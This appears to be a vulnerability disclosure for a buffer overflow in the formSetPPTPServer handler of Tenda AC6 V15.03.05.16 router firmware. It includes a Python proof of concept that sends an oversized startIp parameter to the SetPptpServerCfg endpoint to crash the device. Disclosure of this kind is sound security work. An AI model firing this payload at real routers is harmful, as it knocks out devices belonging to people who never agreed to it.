## Tenda AC6 V15.03.05.16 firmware has a buffer overflow vulnerability in the formSetPPTPServer  function

Firmware download website:
[AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

Tenda AC6 V15.03.05.16 firmware has a buffer overflow vulnerability in the `formSetPPTPServer` function. The `sscanf(s_3, "%[^.].%[^.].%[^.].%s", v13, v14, v15, &v15[8])` function copies the contents of the `startIp` string to `v13, v14, v15, &v15[8]` without performing a boundary check. it will cause a buffer overflow and overwrite the memory area after the array, which may cause the program to crash, thus triggering this security vulnerability.

![image-20250330232638913](README/image-20250330232638913.png)

### POC

```py
import requests

def generate_overflow_data():
    # Target buffer size is 0x400 bytes
    padding = b"X" * 0x400
    
    exploit_data = padding 
    
    return exploit_data

def execute_overflow(url, data):
    # Prepare malicious request parameters
    attack_params = {'startIp':data, 'endIp':'192.168.0.1'}
   

    
    # Send the malicious request twice (as in original)
    server_response = requests.get(url, params=attack_params)
    server_response = requests.get(url, params=attack_params)
    
    # Display server response
    print("HTTP Status:", server_response.status_code)
    print("Response Content:", server_response.text)

if __name__ == "__main__":
    # Target endpoint
    target_url = "http://192.168.102.145/goform/SetPptpServerCfg"
    
    # Generate overflow payload
    malicious_payload = generate_overflow_data()
    
    # Execute the attack
    execute_overflow(target_url, malicious_payload)
```

![image-20250330193538392](README/image-20250330193538392.png)
